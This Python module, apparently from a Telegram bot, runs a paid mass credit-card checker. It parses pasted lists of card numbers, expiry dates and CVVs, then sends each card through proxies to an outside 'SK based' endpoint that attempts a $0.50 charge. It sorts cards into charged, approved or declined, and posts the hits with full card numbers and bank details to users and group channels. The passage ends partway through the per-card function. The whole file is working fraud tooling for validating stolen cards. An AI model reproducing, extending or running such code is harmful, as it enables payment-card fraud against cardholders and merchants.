from live_emoji import plan_badge, dev_badge
from privacy import protect
import asyncio
import os
import random
import re
import logging
import aiohttp
import time
import string
import psycopg2.extras
import itertools as _itertools
import threading as _msk_threading
import time as _msk_time
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIOGRAM IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import (
    is_gate_enabled, get_user_credits, update_credits,
    update_user_stats, get_db_connection,
    deduct_credits_atomic, increment_lifetime_stats
)
from bin import get_bin_info
from sub import get_premium_status
from proxy import global_proxy_manager

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SK_API_ENDPOINT = (
    "https://skbased.stormx.pw/skbased"
    "?key=Darkboy"
    f"&sk={os.environ.get('SK_LIVE_KEY', '')}"
    f"&pk={os.environ.get('PK_LIVE_KEY', '')}"
    "&amount=0.50"
    "&cc={}"
)

GATE_NAME              = "SK Bᴀsᴇᴅ | 0.50$ | Mass"
GATE_KEY               = "msk"
MAX_CARDS              = 5000
CONCURRENCY            = 10
BUTTON_LOCK_SECONDS    = 30
HIT_LOG_GROUP_ID       = -1003963005231
EXTRA_CHARGED_GROUP_ID = -1004330894683
BOT_LINK               = "https://t.me/CHKXWIZ3_BOT"

CUSTOM_APPROVED_EMOJI_ID = "6100515480735321747"
CUSTOM_DECLINED_EMOJI_ID = "5273914604752216432"

# ── Rotating charged emojis (same pool as mchk.py) ──────────────────────────
_CHARGED_EMOJI_IDS = [
    "5287658362660474522","5287547831677112267","5285373878145667586",
    "5287360712836928126","5285024405246725814","5335059614603945751",
    "5197350061012436657","5307554373457440075","5296742257146241213",
    "5285186510197381130","5920279261217820923","5920049201294610186",
    "5235630047959727475","5402114808692626532","5285181291812120474",
    "5283139309740765379","5323415975444372303","5323674506705785412",
    "6026218958900695642","6026031174340579961","6026088864341299395",
    "6023832365833392885","5321167461280662157","5364040533498932357",
    "5462902520215002477","5800688138833629633","5850479475652824718",
    "6170417452162225096","6190572956293272876","5321125250342083365",
    "5765013255709790048","5192786142864356407","5994295021040309628",
    "5231265132826343149","6037083366438737901","5348296214183950233",
    "5769120678963843265","5274115261329322709","5380111356227770863",
    "5206449705143262854","5866429502426454515",
]
_charged_emoji_cycle = _itertools.cycle(_CHARGED_EMOJI_IDS)

def get_next_charged_emoji_id() -> str:
    return next(_charged_emoji_cycle)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION STORAGE & GC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MSK_SESSIONS: dict      = {}
MSK_SESSION_LOCKS: dict = {}

_MSK_SESSION_MAX_AGE = 3600

def _cleanup_msk_sessions():
    cutoff = _msk_time.time() - _MSK_SESSION_MAX_AGE
    dead = [
        sid for sid, s in list(MSK_SESSIONS.items())
        if s.get("status") in ("<b>Sᴜᴍᴍᴀʀʏ</b>", "<b>Sᴛᴏᴘᴘᴇᴅ</b>")
        and s.get("start_time", 0) < cutoff
    ]
    for sid in dead:
        MSK_SESSIONS.pop(sid, None)
        MSK_SESSION_LOCKS.pop(sid, None)

def _start_msk_gc():
    def _loop():
        while True:
            _msk_time.sleep(600)
            try:
                _cleanup_msk_sessions()
            except Exception:
                pass
    _msk_threading.Thread(target=_loop, daemon=True, name="msk_gc").start()

_start_msk_gc()

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MskResultCallback(CallbackData, prefix="mskr"):
    session_id: str
    result_type: str

class MskStopCallback(CallbackData, prefix="msks"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            cc, mm, yy, cvv = match.groups()[:4]
            mm = mm.zfill(2)
            yy = yy[2:] if len(yy) == 4 else yy
            return cc, mm, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        for match in re.findall(pattern, text):
            cc, mm, yy, cvv = match
            mm = mm.zfill(2)
            yy = yy[2:] if len(yy) == 4 else yy
            card_str = f"{cc}|{mm}|{yy}|{cvv}"
            if card_str not in cards:
                cards.append(card_str)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REACTIONS = [
    "airkiss","blush","brofist","celebrate","cheers","clap",
    "cool","cuddle","dance","handhold","happy","hug",
    "kiss","laugh","lick","love","nervous","nom",
    "nuzzle","nyah","pat","peek","shy","sip",
    "sleep","smile","smug","sorry","thumbsup",
    "tickle","tired","wave","wink","yay","yes"
]

async def get_anime_gif() -> str:
    reaction = random.choice(REACTIONS)
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(
                f"https://api.otakugifs.xyz/gif?reaction={reaction}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url", "")
    except Exception:
        pass
    return "https://media.giphy.com/media/LdOyjZ7hx5S3yCjQ8I/giphy.gif"

def _get_proxy_url() -> Optional[str]:
    try:
        return global_proxy_manager.get_proxy()
    except AttributeError:
        pass
    try:
        return global_proxy_manager.get_random()
    except Exception:
        return None

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, ch in enumerate(card_number[::-1]):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

def get_user_display(user_obj, plan_name: str) -> str:
    return f"{user_obj.first_name} ({plan_name})"

async def get_user_plan_name(user_id: int) -> str:
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync():
                conn = get_db_connection()
                cur  = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cur.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cur.fetchone()
                conn.close()
                return row["plan"].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync)
        except Exception as e:
            logging.error(f"[MSK] plan fetch: {e}")
        return "PREMIUM"
    return "FREE"

def is_session_stopped(session_id: str) -> bool:
    s = MSK_SESSIONS.get(session_id)
    if not s:
        return True
    return s.get("status") == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

def is_buttons_locked(session_id: str) -> bool:
    s = MSK_SESSIONS.get(session_id)
    if not s:
        return False
    return (time.time() - s.get("start_time", 0)) < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    s = MSK_SESSIONS.get(session_id)
    if not s:
        return 0
    return max(0, int(BUTTON_LOCK_SECONDS - (time.time() - s.get("start_time", 0))) + 1)

def log_hit_to_msk(user_id, username, first_name):
    try:
        with open("msk.txt", "a", encoding="utf-8") as f:
            f.write(f"{user_id}|{username or 'None'}|{first_name or 'Unknown'}\n")
    except Exception as e:
        logging.error(f"[MSK] log_hit write: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SK API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_sk_response(data: dict) -> Tuple[str, str]:
    """Returns (status, raw_message). status: CHARGED | APPROVED | DECLINED | ERROR"""
    if "_timeout" in data:
        return "ERROR", "Timeout"
    if "_exception" in data:
        return "ERROR", str(data["_exception"])[:80]
    if "_http_error" in data:
        return "ERROR", f"HTTP {data['_http_error']}"

    if "error" not in data:
        raw = data.get("message", "Charged $0.50")
        return "CHARGED", raw

    error        = data["error"]
    message      = error.get("message", "Unknown Error")
    decline_code = error.get("decline_code", "")
    code         = error.get("code", "")

    raw = f"{message} ({decline_code})" if decline_code else message

    if decline_code == "insufficient_funds":
        return "APPROVED", raw
    if decline_code in ("authentication_required", "3d_secure_required"):
        return "APPROVED", raw

    return "DECLINED", raw

async def call_sk_api(full_cc: str) -> dict:
    url       = SK_API_ENDPOINT.format(full_cc)
    proxy_url = _get_proxy_url()
    try:
        async with aiohttp.ClientSession() as sess:
            kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=30)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            async with sess.get(url, **kwargs) as resp:
                if resp.status == 200:
                    return await resp.json(content_type=None)
                return {"_http_error": resp.status}
    except asyncio.TimeoutError:
        return {"_timeout": True}
    except Exception as e:
        return {"_exception": str(e)}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg: str, user_obj, plan_name: str):
    user_link      = protect(build_user_link(user_obj))
    gateway_display = f"SK Bᴀsᴇᴅ | 0.50$"
    safe_response  = html_escape(str(response_msg))
    safe_plan      = html_escape(str(plan_name))
    caption = (
        f"<b><a href='https://t.me/broken_wiz'>[  ɧ ι 𝛕  ]</a></b> "
        f"<b>➺ ᏟꮋꭺꭱƦᏽꭼꭰ</b> "
        f"<tg-emoji emoji-id=\"{get_next_charged_emoji_id()}\">💎</tg-emoji>\n"
        f"<b>Gᴀᴛᴇ ➺</b> <b>{gateway_display}</b>\n"
        f"<b>Rᴀᴡ ➺</b> <code>{safe_response}</code> "
        f"<tg-emoji emoji-id=\"5801044672658805468\">✨</tg-emoji>\n"
        f"<b>Usᴇʀ ➺</b> <b>{user_link}</b> {plan_badge(safe_plan)}"
    )
    kb = {"inline_keyboard": [[
        {
            "text": "𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕]",
            "url": BOT_LINK,
            "style": "primary",
            "icon_custom_emoji_id": "5445104308884370368",
        }
    ]]}
    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID, text=caption,
            parse_mode="HTML", reply_markup=kb,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"[MSK] hit log group error: {e}")

async def send_charged_dm(bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict, user_obj, plan_name: str, time_take=0.0):
    bin_scheme  = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank    = html_escape(str(bin_data.get("bank",   "N/A")))
    country     = html_escape(str(bin_data.get("country","N/A")))
    flag        = bin_data.get("country_emoji", "")
    bin_country = f"{flag} {country}" if flag else country
    emoji_id    = get_next_charged_emoji_id()
    gif_url     = await get_anime_gif()
    user_link   = build_user_link(user_obj)
    dev_link = dev_badge()
    caption = (
        f"<b>Sᴛᴀᴛᴜs ➺ ᏟꮋꭺꭱƦᏽꭼꭰ</b> "
        f"<tg-emoji emoji-id=\"{emoji_id}\">💎</tg-emoji>\n"
        f"<tg-emoji emoji-id=\"5989793276838812063\">💳</tg-emoji> ➺ "
        f"<code>{html_escape(cc_formatted)}</code>\n"
        f"<b>Gᴀᴛᴇ ➺ SK Bᴀsᴇᴅ | 0.50$</b>\n"
        f"<b>Rᴀᴡ ➺ {html_escape(response_msg)}</b>\n"
        f"<b>Iɴꜰᴏ ➺</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"<b>Tɪᴍᴇ ➺ {float(time_take):.2f}s</b>\n"
        f"<b>Usᴇʀ ➺ {user_link} {plan_badge(plan_name)}</b>\n"
        f"<b>Dᴇᴠ ➺ {dev_link}</b>"
    )
    try:
        sent = await bot.send_animation(
            chat_id=user_obj.id, animation=gif_url,
            caption=caption, parse_mode="HTML"
        )
        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=sent.message_id,
                disable_notification=True
            )
        except Exception as pin_err:
            logging.warning(f"[MSK] pin error: {pin_err}")
    except Exception as e:
        logging.warning(f"[MSK] DM charged error: {e}")
    # Also log to extra charged group
    group_caption = caption.replace(user_link, protect(user_link))
    try:
        await bot.send_animation(
            chat_id=EXTRA_CHARGED_GROUP_ID, animation=gif_url,
            caption=group_caption, parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"[MSK] extra group error: {e}")

async def send_approved_dm(bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict, user_obj, plan_name: str, time_take=0.0):
    bin_scheme  = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank    = html_escape(str(bin_data.get("bank",   "N/A")))
    country     = html_escape(str(bin_data.get("country","N/A")))
    flag        = bin_data.get("country_emoji", "")
    bin_country = f"{flag} {country}" if flag else country
    gif_url     = await get_anime_gif()
    user_link   = build_user_link(user_obj)
    dev_link = dev_badge()
    caption = (
        f"<b>Sᴛᴀᴛᴜs ➺ ᎪꮲꮲꭱƦꮎꮩꭼꭰ</b> "
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"<tg-emoji emoji-id=\"5989793276838812063\">💳</tg-emoji> ➺ "
        f"<code>{html_escape(cc_formatted)}</code>\n"
        f"<b>Gᴀᴛᴇ ➺ SK Bᴀsᴇᴅ | 0.50$</b>\n"
        f"<b>Rᴀᴡ ➺ {html_escape(response_msg)}</b>\n"
        f"<b>Iɴꜰᴏ ➺</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"<b>Tɪᴍᴇ ➺ {float(time_take):.2f}s</b>\n"
        f"<b>Usᴇʀ ➺ {user_link} {plan_badge(plan_name)}</b>\n"
        f"<b>Dᴇᴠ ➺ {dev_link}</b>"
    )
    try:
        await bot.send_animation(
            chat_id=user_obj.id, animation=gif_url,
            caption=caption, parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"[MSK] DM approved error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    if result_type == "charged":
        cards_list  = session.get("charged_cards", [])
        type_label  = "ᏟꮋꭺꭱƦᏽꭼꭰ"
        type_emoji  = "💎"
    elif result_type == "approved":
        cards_list  = session.get("approved_cards", [])
        type_label  = "ᎪꮲꮲꭱƦꮎꮩꭼꭰ"
        type_emoji  = "✅"
    elif result_type == "dead":
        cards_list  = session.get("dead_cards", [])
        type_label  = "Dᴇᴀᴅ"
        type_emoji  = "❌"
    else:
        cards_list  = (
            session.get("charged_cards",  []) +
            session.get("approved_cards", []) +
            session.get("dead_cards",     []) +
            session.get("error_cards",    [])
        )
        type_label  = "Aʟʟ"
        type_emoji  = "📁"

    total        = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)
    lines = [
        "[᯼] Gᴀᴛᴇ ➺ SK Bᴀsᴇᴅ | 0.50$",
        "━━━━━━━━━━━━━━━━━━━",
        f"   [◈] Rᴇsᴜʟᴛ ➺ {type_label} {type_emoji}",
        f"   [ᱯ] Tᴏᴛᴀʟ ➺ {total}",
        "━━━━━━━━━━━━━━━━━━━",
    ]

    if total == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for cd in cards_list:
            cc       = cd.get("card", "N/A")
            response = cd.get("response", "N/A")
            bi       = cd.get("bin_info", {})
            country_display = f"{bi.get('country','N/A')} {bi.get('country_emoji','')}"
            lines += [
                f"Cᴀʀᴅ ➺ {cc}",
                f"Gᴀᴛᴇ ➺ SK Bᴀsᴇᴅ | 0.50$",
                f"Rᴀᴡ ➺ {response}",
                f"Bʀᴀɴᴅ ➺ {bi.get('scheme','N/A')}",
                f"Issᴜᴇʀ ➺ {bi.get('bank','N/A')}",
                f"Cᴏᴜɴᴛʀʏ ➺ {country_display.strip()}",
                f"Usᴇʀ ➺ {user_display}",
                "Dᴇᴠ ➺ 𒉼 𝔦 乙",
                "━━━━━━━━━━━━━━━━━━━",
            ]

    content     = "\n".join(lines)
    buf         = BytesIO(content.encode("utf-8"))
    buf.seek(0)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    type_map = {"charged": "CHARGED", "approved": "APPROVED", "dead": "DEAD", "all": "ALL"}
    filename = f"WIZXMSK_SKBASED_{type_map.get(result_type,'ALL')}_{ts}.txt"
    return buf, filename, total

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    s = MSK_SESSIONS.get(session_id, {})
    approved = s.get("approved", 0)
    charged  = s.get("charged",  0)
    dead     = s.get("dead",     0)
    checked  = s.get("checked",  0)

    buttons = []

    buttons.append([
        {
            "text": f"ᎪꮲꮲꭱƦꮎꮩꭼꭰ ({approved})",
            "callback_data": MskResultCallback(session_id=session_id, result_type="approved").pack(),
            "style": "success",
        },
        {
            "text": f"Dᴇᴄʟɪɴᴇᴅ ({dead})",
            "callback_data": MskResultCallback(session_id=session_id, result_type="dead").pack(),
            "style": "danger",
        },
    ])

    buttons.append([
        {
            "text": f"ᏟꮋꭺꭱƦᏽꭼꭰ ({charged})",
            "callback_data": MskResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "primary",
        },
        {
            "text": f"Tᴏᴛᴀʟ ({checked})",
            "callback_data": MskResultCallback(session_id=session_id, result_type="all").pack(),
            "style": "primary",
        },
    ])

    if is_running:
        buttons.append([
            {
                "text": "Sᴛᴏᴘ Sᴇssɪᴏɴ",
                "callback_data": MskStopCallback(session_id=session_id).pack(),
                "style": "danger",
            }
        ])

    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id: str):
    s = MSK_SESSIONS.get(session_id)
    if not s:
        return

    now         = time.time()
    last_upd    = s.get("last_update_time", 0)
    is_finished = s["status"] == "<b>Sᴜᴍᴍᴀʀʏ</b>"
    is_stopped  = s["status"] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

    if not is_finished and not is_stopped and (now - last_upd) < 1.0:
        return

    elapsed = now - s["start_time"]
    mins    = int(elapsed // 60)
    secs    = int(elapsed  % 60)
    elapsed_str = f"{mins}m {secs}s" if mins else f"{secs}s"

    if s["status"] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
        status_icon = "<tg-emoji emoji-id=\"5258077393884562645\">⬜️</tg-emoji>"
    elif s["status"] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        status_icon = "<tg-emoji emoji-id=\"5247149163132493357\">⛔️</tg-emoji>"
    else:
        status_icon = "<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>"

    text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>SK Bᴀsᴇᴅ | 0.50$ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> {s['status']} {status_icon}\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 {s['checked']}/{s['total']} 」</code>\n"
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>{s['approved']} </b>"
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>{s['charged']} </b>"
        f"<tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>{s['dead']} </b>"
        f"<tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"
        f"<b>Eʀʀᴏʀ ➺</b> <b>{s['errors']} </b>"
        f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji>\n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>{elapsed_str}</b> "
        f"<tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji>\n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> "
        f"<tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji>\n"
    )

    if s.get("last_text") == text:
        return

    if session_id not in MSK_SESSION_LOCKS:
        MSK_SESSION_LOCKS[session_id] = asyncio.Lock()

    async with MSK_SESSION_LOCKS[session_id]:
        if s.get("last_text") == text:
            return

        is_running = s["status"] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>"
        kb = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=s["chat_id"], message_id=s["msg_id"],
                text=text, parse_mode="HTML",
                reply_markup=kb, disable_web_page_preview=True
            )
            s["last_text"]        = text
            s["last_update_time"] = now
        except TelegramBadRequest as e:
            if ("message is not modified" not in str(e).lower()
                    and "message to edit not found" not in str(e).lower()):
                logging.error(f"[MSK] progress update error: {e}")
        except Exception as e:
            logging.error(f"[MSK] progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MskResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MskResultCallback):
    try:
        session_id  = callback_data.session_id
        result_type = callback_data.result_type
        s = MSK_SESSIONS.get(session_id)
        if not s:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != s.get("user_id"):
            await callback.answer("❌ No permission", show_alert=True)
            return
        if is_buttons_locked(session_id):
            await callback.answer(
                f"⏳ Please wait {get_remaining_lock(session_id)}s before using buttons",
                show_alert=True
            )
            return

        if result_type == "charged":
            count = len(s.get("charged_cards", []))
        elif result_type == "approved":
            count = len(s.get("approved_cards", []))
        elif result_type == "dead":
            count = len(s.get("dead_cards", []))
        else:
            count = (
                len(s.get("charged_cards",  [])) +
                len(s.get("approved_cards", [])) +
                len(s.get("dead_cards",     [])) +
                len(s.get("error_cards",    []))
            )

        if count == 0:
            labels = {"charged": "Charged", "approved": "Approved", "dead": "Dead", "all": ""}
            await callback.answer(f"❌ No {labels.get(result_type,'')} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj  = s.get("user_obj")
        plan_name = s.get("plan_name", "FREE")

        buf, filename, total = generate_result_file(s, result_type, user_obj, plan_name)
        content = buf.read()
        buf.seek(0)

        type_emojis = {"charged": "💎", "approved": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "ᏟꮋꭺꭱƦᏽꭼꭰ", "approved": "ᎪꮲꮲꭱƦꮎꮩꭼꭰ", "dead": "Dᴇᴄʟɪɴᴇᴅ", "all": "Aʟʟ"}
        caption = (
            f"<b>Rᴇsᴜʟᴛ Tʏᴘᴇ ➺ {type_labels.get(result_type,'All')} {type_emojis.get(result_type,'📁')}</b>\n"
            f"<b>Tᴏᴛᴀʟ Cᴀʀᴅs ➺ {total}</b>\n"
            f"<b>Gᴀᴛᴇ ➺ SK Bᴀsᴇᴅ | 0.50$ | Mass</b>"
        )
        doc = types.BufferedInputFile(file=content, filename=filename)
        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id, document=doc,
                caption=caption, parse_mode="HTML",
                reply_to_message_id=s.get("user_msg_id")
            )
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=doc, caption=caption, parse_mode="HTML")
            else:
                raise
    except Exception as e:
        logging.error(f"[MSK] result callback error: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except Exception:
            pass

@router.callback_query(MskStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MskStopCallback):
    try:
        session_id = callback_data.session_id
        s = MSK_SESSIONS.get(session_id)
        if not s:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != s.get("user_id"):
            await callback.answer("❌ No permission", show_alert=True)
            return
        if is_buttons_locked(session_id):
            await callback.answer(
                f"⏳ Please wait {get_remaining_lock(session_id)}s before using buttons",
                show_alert=True
            )
            return
        if s["status"] != "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        s["status"] = "<b>Sᴛᴏᴘᴘᴇᴅ</b>"
        print(f"🛑 [MSK] Stop signal sent")
        logging.info(f"🛑 [MSK] Stop signal sent")
        cancelled   = 0
        for task in s.get("tasks", []):
            if not task.done():
                task.cancel()
                cancelled += 1

        await callback.answer("🛑 Stopping...", show_alert=False)
        print(f"🛑 [MSK] Cancelled {cancelled} tasks")
        logging.info(f"🛑 [MSK] Cancelled {cancelled} tasks")
        s["last_text"] = ""
        await update_progress_message(callback.bot, session_id)
    except Exception as e:
        logging.error(f"[MSK] stop callback error: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id: str, cc_formatted: str, cc_num: str, user_id: int, bot: Bot, user_obj, plan_name: str):
    check_started = time.time()
    s = MSK_SESSIONS.get(session_id)
    if not s or is_session_stopped(session_id):
        return

    # API call
    try:
        raw_data = await call_sk_api(cc_formatted)
        status_raw, response_msg = parse_sk_response(raw_data)
    except asyncio.TimeoutError:
        status_raw   = "ERROR"
        response_msg = "Timeout"
    except Exception as e:
        status_raw   = "ERROR"
        response_msg = f"Connection Error: {str(e)[:50]}"
        print(f"[MSK ERROR] {cc_formatted} -> {e}")
